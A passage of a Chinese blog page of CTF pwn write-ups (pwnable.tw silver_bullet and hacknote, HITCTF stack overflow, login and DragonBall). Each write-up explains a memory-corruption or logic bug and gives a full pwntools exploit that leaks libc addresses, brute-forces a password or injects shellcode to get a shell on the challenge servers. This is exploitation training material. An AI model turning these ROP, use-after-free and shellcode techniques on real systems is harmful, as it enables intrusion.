<p><strong>1）写入system函数–read_input：</strong>上一步只是泄露了system的地址，并未写入到栈结构中，因此需要另一次机会将system地址写入，程序中提供的read_input函数正好可以实现这个功能。这就要求从puts函数返回之后应该继续执行read_input函数，找到一个pop|retn 的gadget作为ROP1 的返回地址，执行时先pop出puts@got，再返回read_input。</p>
<p>接着构造一个read_input函数的ROP结构，称为ROP2。由于栈溢出只能再写47个字节，再写一个system的ROP结构不够用，因此考虑在另一块空间继续写入system的ROP结构。这个空间可以选在BSS段之后的地址，起名为fake_addr。read_input的第一个参数为fake_addr，第二个参数为大小，返回地址争取直接跳到fake_addr处。</p>
<p>在覆写main函数返回地址时将ebp覆写为fake_addr，之后保证ebp不变，在ROP2的返回地址处写入leave|retn的gadget使得 leave时 esp = ebp = fake_addr，pop ebp，然后返回执行system函数。</p>
<p><img src="/2018/03/08/pwnable-tw-silver-bullet/ROP2.png" alt="read_input函数的ROP2"></p>
<p><strong>2）system函数的ROP</strong>：先是一个随意的值用于pop ebp，接着写入system地址和参数。</p>
<p><img src="/2018/03/08/pwnable-tw-silver-bullet/ROP3.png" alt="system函数的ROP3结构"></p>
<p>整体的栈结构如下：</p>
<p><img src="/2018/03/08/pwnable-tw-silver-bullet/whole.png" alt=""></p>
<p><img src="/2018/03/08/pwnable-tw-silver-bullet/ROP3.png" alt="整体栈结构"></p>
<h2 id="4-exp"><a href="#4-exp" class="headerlink" title="4) exp"></a>4) exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">'./silver_bullet'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'./libc.so'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'chall.pwnable.tw'</span>,<span class="number">10103</span>)</span><br><span class="line">    libc = ELF(<span class="string">'./libc_32.so.6'</span>)</span><br><span class="line"></span><br><span class="line">d = <span class="number">0</span></span><br><span class="line"><span class="comment">#gdb.attach(p,'b*0x80485eb')</span></span><br><span class="line"><span class="comment"># create size:47</span></span><br><span class="line">p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Give me your description of bullet :'</span>)</span><br><span class="line">payload1 =<span class="string">'a'</span> * <span class="number">47</span></span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># overflow size:1</span></span><br><span class="line">p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Give me your another description of bullet :'</span>)</span><br><span class="line">payload2 =<span class="string">'b'</span></span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line"><span class="comment">#overwrite stack</span></span><br><span class="line">p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Give me your another description of bullet :'</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = <span class="number">0x80484a8</span></span><br><span class="line">puts_got = <span class="number">0x804afdc</span></span><br><span class="line">fake_addr = <span class="number">0x804b410</span></span><br><span class="line"></span><br><span class="line">pr_addr = <span class="number">0x08048475</span></span><br><span class="line">lr_addr = <span class="number">0x8048a18</span></span><br><span class="line">read_input = <span class="number">0x80485eb</span></span><br><span class="line">payload3 = <span class="string">'\xff'</span> * <span class="number">3</span> + p32(fake_addr) + p32(puts_plt) + p32(pr_addr) + p32(puts_got) + p32(read_input) + p32(lr_addr) + p32(fake_addr) + p32(<span class="number">0x1011</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload3)</span><br><span class="line"><span class="comment">#beat and execute </span></span><br><span class="line">p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line"><span class="keyword">if</span> d:</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Oh ! You win !!\n'</span>)</span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">system_addr = puts_addr - (libc.symbols[<span class="string">'puts'</span>]-libc.symbols[<span class="string">'system'</span>])</span><br><span class="line"><span class="keyword">print</span> <span class="string">'puts_addr: 0x%x'</span> %puts_addr</span><br><span class="line"></span><br><span class="line"><span class="comment">#read_input content</span></span><br><span class="line">payload = p32(fake_addr) + p32(system_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(fake_addr + <span class="number">0x10</span>) + <span class="string">'/bin/sh'</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2018/03/08/pwnable-tw-hacknote/">
                pwnable.tw--hacknote
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2018-03-08</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <h1 id="hacknote"><a href="#hacknote" class="headerlink" title="hacknote"></a>hacknote</h1><h2 id="1-基本逻辑"><a href="#1-基本逻辑" class="headerlink" title="1)基本逻辑"></a>1)基本逻辑</h2><p>这又是一道malloc相关的内存题目，但是不是老套路。三个函数：add_note，delete_note和print_note。</p>
<p>使用add_note分配的地址用一个堆表（自己起的名字）存放，（其实就是一个存放地址的数组）。通过add_note可以看出分配的每个块是什么结构：</p>
<p><img src="/2018/03/08/pwnable-tw-hacknote/addnote.png" alt="add_note"></p>
<p>首先在ptr[i]中存放一个8字节大小的block（实际malloc分配了16字节）地址；然后这个地址中（称为note块）前4个字节是一个函数地址，即输出地址+4中的内容：</p>
<p><img src="/2018/03/08/pwnable-tw-hacknote/puts.png" alt="函数内容"></p>
<p>另外四个字节存放一个新分配的content块的地址，大小size由用户进行输入。对于一个初始状态的地址空间，add_note后的结构如下：</p>
<hr>
<p><img src="/2018/03/08/pwnable-tw-hacknote/note结构.png" alt="note结构，content结构"></p>
<hr>
<p>delete_note就是先释放content地址这块空间，再释放malloc（8）这块空间。</p>
<p>print_note就是调用note块的第一个字段即puts函数</p>
<h2 id="2-漏洞"><a href="#2-漏洞" class="headerlink" title="2)漏洞"></a>2)漏洞</h2><p>deltenote将note和content释放之后并没有将ptr[i]置为空，也就是说，虽然指针所指向的内存释放掉了，但实际内容还在，我们仍然能使用，即UAF。</p>
<h2 id="3）漏洞利用"><a href="#3）漏洞利用" class="headerlink" title="3）漏洞利用"></a>3）漏洞利用</h2><p>本题的关键点是，当某一次申请的content大小也为8时，将有机会分配到之前释放过的note块。这样通过向content中写入内容相当于修改note块。由此达到目的。 </p>
<p><strong>system函数地址泄露</strong>：print_note的打印功能可以帮助泄露地址。例如，先add note0，大小为128，再add note1，大小为128。delete note1，note0.此时再申请add note2，大小为8. 那么note2的note块就是note0块，note2的content块就是note1块（fastbin的原则是LIFO）。此时向content2中写入puts函数地址（保持不变，还是原来的）和free@got地址，这样在调用 print note2时，就会将free函数的实际地址泄露，再根据偏移泄露system函数地址。</p>
<p><strong>system函数调用</strong>：同理，这个操作与地址泄露相似，delete note2，add note3，也是要求content大小为8，这次将puts函数地址位置覆写成泄露的system函数地址和将要执行的指令。 </p>
<p>这里涉及一个知识点：Linux连续执行多条命令<a href="http://blog.csdn.net/freedom2028/article/details/7104131" target="_blank" rel="noopener">http://blog.csdn.net/freedom2028/article/details/7104131</a> 仔细看print_note，最终调用函数时，参数也是同一个地址：</p>
<p><img src="/2018/03/08/pwnable-tw-hacknote/printnote.png" alt="print_note"></p>
<p> 即，如果将puts函数地址覆盖为system地址，system的参数是system函数地址本身，这样肯定不行。但是使用连续执行多条命令的’ ; ‘，第一条执行错误会被忽略，然后执行下一条，因此可以将content位置覆盖成 ‘;sh\0’.</p>
<h2 id="4）exp"><a href="#4）exp" class="headerlink" title="4）exp"></a>4）exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_note</span><span class="params">(size,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Note size :'</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">'Content :'</span>)</span><br><span class="line">	p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_note</span><span class="params">(index)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">	p.sendline(<span class="string">'2'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Index :'</span>)</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_note</span><span class="params">(index)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">	p.sendline(<span class="string">'3'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Index :'</span>)</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span> </span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	p = process(<span class="string">'./hacknote'</span>)</span><br><span class="line">	libc = ELF(<span class="string">'./libc.so'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">'chall.pwnable.tw'</span>, <span class="number">10102</span>)</span><br><span class="line">	libc = ELF(<span class="string">'./libc_32.so.6'</span>)</span><br><span class="line">add_note(<span class="number">128</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">add_note(<span class="number">128</span>,<span class="string">'bbbb'</span>)</span><br><span class="line">delete_note(<span class="number">1</span>)</span><br><span class="line">delete_note(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload = p32(<span class="number">0x804862b</span>)+p32(<span class="number">0x804A018</span>)</span><br><span class="line">add_note(<span class="number">8</span>,payload)</span><br><span class="line"></span><br><span class="line">print_note(<span class="number">1</span>)</span><br><span class="line">free_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"free_addr:%x"</span> %free_addr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">offset = libc.symbols[<span class="string">'system'</span>] - libc.symbols[<span class="string">'free'</span>]</span><br><span class="line">system_addr = free_addr + offset</span><br><span class="line"></span><br><span class="line">delete_note(<span class="number">2</span>)</span><br><span class="line">payload = p32(system_addr) + <span class="string">';sh\0'</span></span><br><span class="line">add_note(<span class="number">8</span>,payload)</span><br><span class="line"></span><br><span class="line">print_note(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	gdb.attach(p)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"offset:%x,system_addr: %x"</span> %(offset,system_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2018/02/07/HITCTF-PWN/">
                HITCTF PWN
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2018-02-07</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <h2 id="1-STACK-OVERFLOW"><a href="#1-STACK-OVERFLOW" class="headerlink" title="1. STACK OVERFLOW"></a>1. STACK OVERFLOW</h2><h3 id="1-基本逻辑"><a href="#1-基本逻辑" class="headerlink" title="1) 基本逻辑"></a>1) 基本逻辑</h3><p>main函数调用vuln函数，vuln函数中输入name字符串：</p>
<p><img src="/2018/02/07/HITCTF-PWN/stackoverflow_1.png" alt="vuln函数"></p>
<h3 id="2-漏洞"><a href="#2-漏洞" class="headerlink" title="2) 漏洞"></a>2) 漏洞</h3><p>vuln函数中buf的地址是ebp-28h，即buf大小为0x28，但在读入字符串时，read参数是0x40，即栈溢出漏洞。</p>
<h3 id="3-漏洞利用"><a href="#3-漏洞利用" class="headerlink" title="3) 漏洞利用"></a>3) 漏洞利用</h3><p>保护机制： NX堆栈不可执行</p>
<p><img src="/2018/02/07/HITCTF-PWN/stackoverflow_2.png" alt="checksec"></p>
<p>在IDA的函数一栏发现有一个flag的函数，利用该函数执行shell ：</p>
<p><img src="/2018/02/07/HITCTF-PWN/stackoverflow_3.png" alt="flag函数"></p>
<p>通过栈溢出构造ROP：将vuln函数返回地址覆盖为flag，同时写入flag函数执行所需要的参数a1和a2。</p>
<h3 id="4-exp"><a href="#4-exp" class="headerlink" title="4) exp"></a>4) exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">flag_addr = <span class="number">0x080485DF</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line"></span><br><span class="line">    p= process(<span class="string">"./stackoverflow"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">    p = remote(<span class="string">"111.230.132.82"</span>,<span class="number">40000</span>)</span><br><span class="line"></span><br><span class="line">payload= <span class="string">'a'</span>*<span class="number">44</span></span><br><span class="line"></span><br><span class="line">payload += p32(flag_addr)</span><br><span class="line"></span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>) + p32(<span class="number">0xdeadbeef</span>)+p32(<span class="number">12648430</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Welcome to pwn world!\nLeave your name:"</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="2-login"><a href="#2-login" class="headerlink" title="2.login"></a>2.login</h2><h3 id="1-基本逻辑-1"><a href="#1-基本逻辑-1" class="headerlink" title="1) 基本逻辑"></a>1) 基本逻辑</h3><p><img src="/2018/02/07/HITCTF-PWN/login_1.png" alt="main函数"></p>
<p>main函数首先调用login()函数，用户输入username和password后，与服务器端预设的值进行比较。有两个用户：root和lilac。需要注意的是，strncmp的第三个参数，这个参数代表需要比较多少个字符。仔细看login函数中的strncmp是有问题的。（见2.漏洞）</p>
<p><img src="/2018/02/07/HITCTF-PWN/login_2.png" alt="login"></p>
<p>从login返回之后，main函数会对登录是否成功进行判定，只有当用户为root且通过了login函数的比对操作才能继续进行，其余情况都会直接exit。而且即使login函数通过了之后，main函数还接着调用了check()函数来再次检查用户名和密码。注意，仔细查看login和check函数中的strncmp的第三个参数是不一样的：login中第三个参数是用户输入的长度，check中是指定的长度。</p>
<p><img src="/2018/02/07/HITCTF-PWN/login_3.png" alt="check"></p>
<h3 id="2-漏洞-1"><a href="#2-漏洞-1" class="headerlink" title="2) 漏洞"></a>2) 漏洞</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">n = read_input_raw(username, <span class="number">16</span>);</span><br><span class="line">v3 = read_input_raw(password, <span class="number">32</span>);</span><br><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(username,<span class="string">"root"</span>,n)&amp;&amp;!<span class="built_in">strncmp</span>(password,<span class="string">"passwd_has_be_changed_in_remote_"</span>, v3) )</span><br><span class="line"> &#123;</span><br><span class="line">   v1 = <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>login函数第三个参数是用户输入的字符串长度，比如，我们只输入一个字符，那么strncmp就只比较两个字符串的一个字符，如果恰巧蒙对了，strncmp就返回0（代表相等）；没蒙对就继续蒙，直到蒙到第一位是正确的。由此，可以通过暴力破解依次获取每一位password。需要注意的是，我们拿到的可执行文件和服务器上的不是一个，出题人在password处暗示我们了：passwd_has<em>be</em> changed_in<em>remote</em></p>
<h3 id="3-漏洞利用-1"><a href="#3-漏洞利用-1" class="headerlink" title="3) 漏洞利用"></a>3) 漏洞利用</h3><p>从check函数中可以看出，root用户的密码为32位。通过暴力破解，多次启动进程，从返回结果是否是”How can you login successful as root!”来判断该位是否正确。可以通过查看ASCII表中可见字符的范围来缩小暴力破解的次数，我用的是33-126。</p>
<h3 id="4-exp-1"><a href="#4-exp-1" class="headerlink" title="4) exp"></a>4) exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#暴力破解</span></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">32</span>):</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">33</span>,<span class="number">126</span>):</span><br><span class="line">		<span class="keyword">if</span> debug:</span><br><span class="line">			p= process(<span class="string">"./login"</span>)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			p = remote(<span class="string">"111.230.132.82"</span>,<span class="number">40001</span>)</span><br><span class="line">		p.recvuntil(<span class="string">"Username: "</span>)</span><br><span class="line">		username = <span class="string">"root"</span></span><br><span class="line">		p.sendline(username)</span><br><span class="line"></span><br><span class="line">		p.recvuntil(<span class="string">"Password: "</span>)</span><br><span class="line">		tmp = pwd+chr(i) </span><br><span class="line"></span><br><span class="line">		p.sendline(tmp)</span><br><span class="line">		hint = p.recvline()</span><br><span class="line">		<span class="comment">#print hint</span></span><br><span class="line">		<span class="keyword">if</span> <span class="string">"How can you login successful as root!"</span> <span class="keyword">in</span> hint:</span><br><span class="line">			pwd+=chr(i)</span><br><span class="line">			p.close()</span><br><span class="line">			<span class="keyword">print</span> pwd</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		p.close()</span><br><span class="line"><span class="keyword">print</span> pwd</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#发送正确的username和password</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	p= process(<span class="string">"./login"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">"111.230.132.82"</span>,<span class="number">40001</span>)</span><br><span class="line">    </span><br><span class="line">p.recvuntil(<span class="string">"Username: "</span>)</span><br><span class="line">username = <span class="string">"root"</span></span><br><span class="line">p.sendline(username)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Password: "</span>)</span><br><span class="line">pwd=<span class="string">"XXXXX"</span> <span class="comment">#此处就是上一步暴力破解获取的pwd</span></span><br><span class="line">p.sendline(pwd)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="3-DragonBall"><a href="#3-DragonBall" class="headerlink" title="3. DragonBall"></a>3. DragonBall</h2><h3 id="1-基本逻辑-2"><a href="#1-基本逻辑-2" class="headerlink" title="1)基本逻辑"></a>1)基本逻辑</h3><p>一个小游戏，一共有15块，要集齐七个龙珠才能许愿，我们能实现的操作有买龙珠、卖龙珠、打印龙珠和对着龙珠许愿：P。</p>
<p><img src="/2018/02/07/HITCTF-PWN/dragonball_1.png" alt="main"></p>
<p>买的时候龙珠5块钱一个，但是注意，if里面只判断了money是否为0，并没有判断&gt;0</p>
<p><img src="/2018/02/07/HITCTF-PWN/dragonball_2.png" alt="buy"></p>
<p>卖的时候龙珠只有3块钱，但这里在后续我们利用漏洞起到了一定作用。</p>
<p><img src="/2018/02/07/HITCTF-PWN/dragonball_3.png" alt="sell"></p>
<p>wish函数里，向v1里读入wish字符串，向v2里读入yes or no，正常人会用这么大的缓冲区放yes和no吗？？v2分配了0x38大小，但是读入的时候读了0x40个字符，也就是说可以有8个字节的缓冲区溢出。v1分配了0x30大小，但是读入的时候读了0x68个字节。</p>
<p><img src="/2018/02/07/HITCTF-PWN/dragonball_4.png" alt="wish"></p>
<h3 id="2-漏洞-2"><a href="#2-漏洞-2" class="headerlink" title="2)漏洞"></a>2)漏洞</h3><p>首先，buy函数里，只要money不是0，是负数也无所谓，可以无穷尽的买卖，这样很快就能达到7个龙珠了。</p>
<p>其次，wish函数里v1和v2都可以进行缓冲区溢出。v1读入的0x68个字节可以占用v2的空间，v2读入的0x40正好可以修改返回地址。</p>
<h3 id="3-漏洞利用-2"><a href="#3-漏洞利用-2" class="headerlink" title="3)漏洞利用"></a>3)漏洞利用</h3><p>保护机制：喜大普奔！这题没有开NX！也就是可以在栈上写入shell并执行</p>
<p><img src="/2018/02/07/HITCTF-PWN/dragonball_5.png" alt="checksec"></p>
<p>利用的思路就是：在v1或v2的位置写入shell，然后要获取栈地址，并将这个地址通过v2写入wish的返回地址，最后wish返回之后就能直接执行shell。</p>
<p>其余都好弄，就是如何获取栈上的地址。在gdb调试过程中，通过查看栈，发现此时ebp的值为0xffffc818，向上两个单元中的值总是和ebp相差0x10，而这个位置正好可以通过读取v1来得到，这样就得到了栈上的地址。可以发现，wish中会将v1中的内容打印出来（Your wish is %s…）。由此，先将v1中这个位置之前的内容都填满，共0x68-8=0x60个字节，其中包含着可执行的shell；然后再通过v2将返回地址的位置填上v1的地址即可。</p>
<p><img src="/2018/02/07/HITCTF-PWN/dragonball_6.png" alt="gdb"></p>
<h3 id="4-exp-2"><a href="#4-exp-2" class="headerlink" title="4)exp"></a>4)exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	p = process(<span class="string">'./DragonBall'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">'111.230.132.82'</span>,<span class="number">40002</span>)</span><br><span class="line"><span class="comment">#buy dragonball</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">2</span>):</span><br><span class="line">	p.recvuntil(<span class="string">'You choice: '</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'You choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">6</span>):</span><br><span class="line">	p.recvuntil(<span class="string">'You choice: '</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#make a wish</span></span><br><span class="line">p.recvuntil(<span class="string">'You choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Tell me your wish: '</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">payload = shellcode.ljust(<span class="number">0x60</span>,<span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">'Your wish is '</span>)</span><br><span class="line">p.recv(<span class="number">0x60</span>)</span><br><span class="line">stack_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">wish_addr = stack_addr<span class="number">-0x10</span><span class="number">-0x68</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"wish_addr:0x%x"</span>%wish_addr</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'is it right?\n(Y/N) '</span>)</span><br><span class="line">payload = <span class="number">60</span>*<span class="string">'a'</span>+p32(wish_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="4-nodes"><a href="#4-nodes" class="headerlink" title="4.nodes"></a>4.nodes</h2><h3 id="1-基本逻辑-3"><a href="#1-基本逻辑-3" class="headerlink" title="1) 基本逻辑"></a>1) 基本逻辑</h3><p>主要是对一个单向链表上的节点进行操作。</p>
